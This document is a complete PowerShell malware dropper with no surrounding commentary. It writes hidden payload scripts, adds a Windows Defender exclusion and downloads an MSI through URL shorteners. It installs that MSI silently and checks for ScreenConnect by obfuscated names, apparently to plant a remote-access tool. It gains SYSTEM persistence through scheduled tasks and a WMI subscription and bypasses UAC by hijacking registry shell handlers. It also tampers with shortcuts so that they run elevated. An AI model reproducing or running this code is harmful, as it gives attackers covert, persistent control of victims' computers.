$sys32Content = @'
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

function Obfuscate {
    param([string]$str)
    $result = ""
    foreach($char in $str.ToCharArray()) {
        $result += [char]([int]$char + 2)
    }
    return $result
}

function Deobfuscate {
    param([string]$str)
    $result = ""
    foreach($char in $str.ToCharArray()) {
        $result += [char]([int]$char - 2)
    }
    return $result
}

function HideWindow {
    try {
        $code = @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
        Add-Type -TypeDefinition $code -Language CSharp
        [Window]::ShowWindow([Window]::GetConsoleWindow(), 0) | Out-Null
    } catch {}
}

function IsScreenConnectRunning {
    $patterns = @(
        (Deobfuscate "uetggpeqppgev"),
        (Deobfuscate "eqppgevykug0eqpvtqn"),
        (Deobfuscate "h85c:4hhch;h;5f3")
    )
    
    $found = 0
    
    try {
        $processes = Get-Process
        foreach ($proc in $processes) {
            foreach ($pattern in $patterns) {
                if ($proc.Name -like "*$pattern*" -or $proc.Path -like "*$pattern*") {
                    $found++
                    break
                }
            }
        }
    } catch {}
    
    try {
        $services = Get-Service
        foreach ($svc in $services) {
            foreach ($pattern in $patterns) {
                if ($svc.Name -like "*$pattern*" -or $svc.DisplayName -like "*$pattern*") {
                    $found++
                    break
                }
            }
        }
    } catch {}
    
    try {
        $ports = @(8040, 8041)
        $connections = Get-NetTCPConnection -State Established
        foreach ($conn in $connections) {
            if ($conn.RemotePort -in $ports -or $conn.LocalPort -in $ports) {
                $found++
                break
            }
        }
    } catch {}
    
    return ($found -ge 2)
}

function DownloadFile {
    param($url, $destination)
    
    try {
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $client.DownloadFile($url, $destination)
        if (Test-Path $destination) { return $true }
    } catch {}
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
        if (Test-Path $destination) { return $true }
    } catch {}
    
    try {
        Start-BitsTransfer -Source $url -Destination $destination
        if (Test-Path $destination) { return $true }
    } catch {}
    
    return $false
}

function UnblockFile {
    param($filePath)
    
    try { Remove-Item -Path "$filePath`:Zone.Identifier" -Force } catch {}
    try { Unblock-File -Path $filePath } catch {}
    try { cmd /c "echo.>""$filePath`:Zone.Identifier""" } catch {}
}

try {
    HideWindow
    
    Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 90)
    
    if (IsScreenConnectRunning) { exit }
    
    $publicPath = "C:\Users\Public"
    $folderName = "System" + (Get-Random -Minimum 1000 -Maximum 9999)
    $folderPath = Join-Path $publicPath $folderName
    
    try {
        if (!(Test-Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory -Force | Out-Null
        }
        
        $folder = Get-Item -Path $folderPath -Force
        $folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch {
        $folderPath = [System.IO.Path]::GetTempPath()
    }
    
    try {
        Add-MpPreference -ExclusionPath $folderPath -Force
    } catch {}
    
    $msiPath = Join-Path $folderPath "update.msi"
    $urls = @(
        "https://tinyurl.com/sysmsidp",
        "https://tinyurl.com/sysmsi1",
        "https://bit.ly/sosmsid",
        "https://bit.ly/sysmsl"
    )
    
    $downloaded = $false
    foreach ($url in $urls) {
        if (DownloadFile -url $url -destination $msiPath) {
            $downloaded = $true
            break
        }
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
    }
    
    if (-not $downloaded) { exit }
    
    UnblockFile -filePath $msiPath
    
    $maxAttempts = 3
    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        try {
            if ($attempt -eq 1) {
                $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -PassThru
            }
            elseif ($attempt -eq 2) {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "msiexec.exe"
                $psi.Arguments = "/i `"$msiPath`" /qn /norestart"
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($psi)
            }
            else {
                $cmdLine = "start /min msiexec.exe /i `"$msiPath`" /qn /norestart"
                $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdLine" -WindowStyle Hidden -PassThru
            }
            
            for ($i = 1; $i -le 6; $i++) {
                Start-Sleep -Seconds 10
                
                if (IsScreenConnectRunning) {
                    [System.GC]::Collect()
                    exit
                }
            }
        } catch {}
        
        if ($attempt -lt $maxAttempts) {
            Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
        }
    }
} catch {} finally {
    [System.GC]::Collect()
}
'@

$sys64Content = @'
function CheckTaskExists {
    param([string]$taskName)
    try {
        $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        return ($task -ne $null)
    } catch {
        return $false
    }
}

function CreatePrimaryTask {
    try {
        schtasks /create /tn "sysv1" /tr 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\CMDx32Update.ps1"' /sc onstart /ru SYSTEM /rl HIGHEST /f
        return CheckTaskExists -taskName "sysv1"
    } catch {
        return $false
    }
}

function CreateFallbackTask {
    try {
        $taskName = "sysv2"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File 'C:\Users\Public\CMDx32Update.ps1'"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
        return CheckTaskExists -taskName $taskName
    } catch {
        return $false
    }
}

function CreateWmiSubscription {
    try {
        $filter = @{
            name = "SystemStartupFilter";
            EventNameSpace = 'root\cimv2';
            QueryLanguage = "WQL";
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        }
        $consumer = @{
            name = "SystemStartupConsumer";
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File 'C:\Users\Public\CMDx32Update.ps1'"
        }
        $binding = @{
            Filter = $filter;
            Consumer = $consumer
        }
        $null = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filter
        $null = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer
        $null = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $binding
        return $true
    } catch {
        return $false
    }
}

function Remove-ElevatedShortcuts {
    $profileDirs = @(Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" |
        ForEach-Object { (Get-ItemProperty $_.PSPath).ProfileImagePath } |
        Where-Object { Test-Path $_ })

    foreach ($dir in $profileDirs) {
        $desktop = "$dir\Desktop"
        $taskbar = "$dir\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"

        foreach ($path in @($desktop, $taskbar)) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Filter "*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                        if ($bytes.Length -gt 0x15 -and ($bytes[0x15] -band 0x20)) {
                            $bytes[0x15] = $bytes[0x15] -band 0xDF
                            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
                        }
                    } catch {}
                }
            }
        }
    }
}

$createSuccess = $false
$maxWaitTime = 30
$startTime = Get-Date

$createSuccess = CreatePrimaryTask
if (-not $createSuccess) {
    $createSuccess = CreateFallbackTask
    
    if (-not $createSuccess) {
        $createSuccess = CreateWmiSubscription
    }
}

while ((-not $createSuccess) -and ((Get-Date) - $startTime).TotalSeconds -lt $maxWaitTime) {
    Start-Sleep -Seconds 2
    $createSuccess = (CheckTaskExists -taskName "sysv1") -or (CheckTaskExists -taskName "sysv2")
}

if ($createSuccess) {
    Remove-ElevatedShortcuts
}
'@

function Save-ContentToFile {
    param(
        [string]$Content,
        [string]$FilePath
    )
    
    $maxAttempts = 3
    $success = $false
    
    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        try {
            $Content | Out-File -FilePath $FilePath -Encoding UTF8 -Force
            if (Test-Path $FilePath) {
                $success = $true
                break
            }
        } catch { }
        
        try {
            Set-Content -Path $FilePath -Value $Content -Force
            if (Test-Path $FilePath) {
                $success = $true
                break
            }
        } catch { }
        
        try {
            [System.IO.File]::WriteAllText($FilePath, $Content)
            if (Test-Path $FilePath) {
                $success = $true
                break
            }
        } catch { }
        
        try {
            $encodedContent = $Content -replace '"', '\"'
            cmd.exe /c "echo $encodedContent > `"$FilePath`"" 2>$null
            if (Test-Path $FilePath) {
                $success = $true
                break
            }
        } catch { }
        
        Start-Sleep -Milliseconds 500
    }
    
    return $success
}

function Set-ShortcutElevated {
    param(
        [string]$ShortcutPath
    )
    
    try {
        if (Test-Path $ShortcutPath) {
            $bytes = [System.IO.File]::ReadAllBytes($ShortcutPath)
            $bytes[0x15] = $bytes[0x15] -bor 0x20
            [System.IO.File]::WriteAllBytes($ShortcutPath, $bytes)
            return $true
        }
    } catch { }
    
    return $false
}

function Elevate-DesktopShortcuts {
    $desktopPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)
    $allUsersDesktopPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::CommonDesktopDirectory)
    
    Get-ChildItem -Path $desktopPath -Filter "*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
        Set-ShortcutElevated -ShortcutPath $_.FullName
    }
    
    Get-ChildItem -Path $allUsersDesktopPath -Filter "*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
        Set-ShortcutElevated -ShortcutPath $_.FullName
    }
}

function Elevate-TaskbarShortcuts {
    $taskbarPath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
    
    if (Test-Path $taskbarPath) {
        Get-ChildItem -Path $taskbarPath -Filter "*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
            Set-ShortcutElevated -ShortcutPath $_.FullName
        }
    }
    
    $startLayoutPath = "$env:LOCALAPPDATA\Microsoft\Windows\Shell\LayoutModification.xml"
    if (Test-Path $startLayoutPath) {
        try {
            $taskbarItems = Get-ChildItem -Path "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" -Filter "*.lnk" -ErrorAction SilentlyContinue
            foreach ($item in $taskbarItems) {
                Set-ShortcutElevated -ShortcutPath $item.FullName
            }
        } catch {}
    }
}

function Ensure-Directory {
    param([string]$Path)
    
    if (-not (Test-Path $Path)) {
        try {
            New-Item -Path $Path -ItemType Directory -Force | Out-Null
            return $true
        } catch {
            return $false
        }
    }
    
    return $true
}

function Set-UACBypassRegistry {
    param(
        [string]$Sys32Path,
        [string]$Sys64Path
    )
    
    $success = $false
    
    try {
        $regPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        
        $command = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys32Path`" & powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys64Path`""
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command -Force
        $success = $true
    } catch {}
    
    if (-not $success) {
        try {
            $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            
            $command = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys32Path`" & powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys64Path`""
            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command -Force
            $success = $true
        } catch {}
    }
    
    if (-not $success) {
        try {
            $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            
            $command = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys32Path`" & powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -File `"$Sys64Path`""
            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command -Force
            $success = $true
        } catch {}
    }
    
    return $success
}

function Verify-FileExists {
    param([string]$FilePath)
    
    return (Test-Path $FilePath)
}

function Set-FileProtection {
    param([string]$FilePath)
    
    try {
        $file = Get-Item -Path $FilePath -Force
        $file.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        
        $acl = Get-Acl -Path $FilePath
        $acl.SetAccessRuleProtection($true, $false)
        
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", "FullControl", "Allow")
        $acl.AddAccessRule($systemRule)
        
        $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators", "FullControl", "Allow")
        $acl.AddAccessRule($adminRule)
        
        Set-Acl -Path $FilePath -AclObject $acl
        
        return $true
    } catch {
        return $false
    }
}

try {
    $publicFolder = "C:\Users\Public"
    $sys32Path = Join-Path $publicFolder "CMDx32Update.ps1"
    $sys64Path = Join-Path $publicFolder "CMDx64Update.ps1"
    
    Ensure-Directory -Path $publicFolder

    $sys32Saved = Save-ContentToFile -Content $sys32Content -FilePath $sys32Path
    $sys64Saved = Save-ContentToFile -Content $sys64Content -FilePath $sys64Path
    
    if (-not (Verify-FileExists -FilePath $sys32Path) -or -not (Verify-FileExists -FilePath $sys64Path)) {
        exit 1
    }
    
    Set-FileProtection -FilePath $sys32Path
    Set-FileProtection -FilePath $sys64Path
    
    $registrySuccess = Set-UACBypassRegistry -Sys32Path $sys32Path -Sys64Path $sys64Path
    
    if (-not $registrySuccess) {
        exit 1
    }
    
    Elevate-DesktopShortcuts
    Elevate-TaskbarShortcuts
    
} catch {
    exit 1
}
